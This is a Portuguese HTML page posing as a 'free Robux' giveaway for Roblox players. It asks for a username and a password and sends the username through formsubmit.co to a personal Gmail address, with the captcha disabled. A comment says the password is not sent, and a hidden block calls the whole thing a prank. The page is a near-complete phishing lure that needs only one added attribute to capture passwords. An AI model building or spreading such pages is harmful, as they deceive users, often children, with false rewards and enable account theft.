<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robux Grátis</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #111;
    color: white;
    text-align: center;
}

.caixa {
    width: 90%;
    max-width: 400px;
    margin: 80px auto;
    padding: 30px;
    background: #222;
    border-radius: 15px;
}

input, button {
    width: 90%;
    padding: 12px;
    margin: 8px;
    border-radius: 8px;
    border: none;
    box-sizing: border-box;
}

button {
    background: #00c853;
    color: white;
    font-size: 17px;
    cursor: pointer;
}

#pegadinha {
    display: none;
}
</style>
</head>

<body>

<div class="caixa" id="login">

    <h1>💰 Robux Grátis</h1>
    <p>Digite seu nome para participar!</p>

    <form action="https://formsubmit.co/enzorenascido2@gmail.com" method="POST">

        <input
            type="text"
            name="nome"
            placeholder="Nome de usuário"
            required
        >

        <!-- A senha NÃO é enviada nem armazenada. -->
        <input
            type="password"
            placeholder="Senha (não será enviada)"
            autocomplete="off"
        >

        <input
            type="hidden"
            name="_subject"
            value="Novo nome recebido"
        >

        <input
            type="hidden"
            name="_captcha"
            value="false"
        >
<input
    type="hidden"
    name="_next"
    value="https://enzorenascido2-glitch.github.io/site-robux/obrigado.html"
>
        <button type="submit">
            RECEBER ROBUX
        </button>

    </form>

</div>

<div class="caixa" id="pegadinha">
    <h1>🎉 10.000 ROBUX!</h1>
    <p>Processando...</p>
    <h2>😂 ERA PEGADINHA!</h2>
</div>

</body>
</html>
